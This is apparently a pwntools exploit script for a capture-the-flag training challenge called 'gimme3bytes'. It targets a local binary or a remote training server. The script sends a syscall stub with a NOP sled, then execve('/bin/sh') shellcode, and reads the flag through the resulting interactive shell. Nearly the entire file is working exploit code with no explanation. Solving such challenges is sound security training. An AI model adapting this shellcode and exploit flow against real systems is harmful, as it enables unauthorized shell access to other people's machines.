from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
COMMANDS = """
b *0x4011DE
c
"""

context.arch = "amd64"

if args.REMOTE:
    c = remote("gimmie3bytes.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug("./gimme3bytes", gdbscript = COMMANDS) 
    else:
        c= process("./gimme3bytes")

shellcode = asm("""
syscall
nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
                nop
""")

shellcode2 = asm("""
xor rax, rax
mov rax, 0x3b
xor edx, edx
xor esi, esi
xor rdi, rdi
mov rdi, 0x68732f6e69622f
push rdi
mov rdi, rsp
syscall
""")


c.sendline(shellcode+shellcode2)
c.sendline("cat flag")
c.interactive()
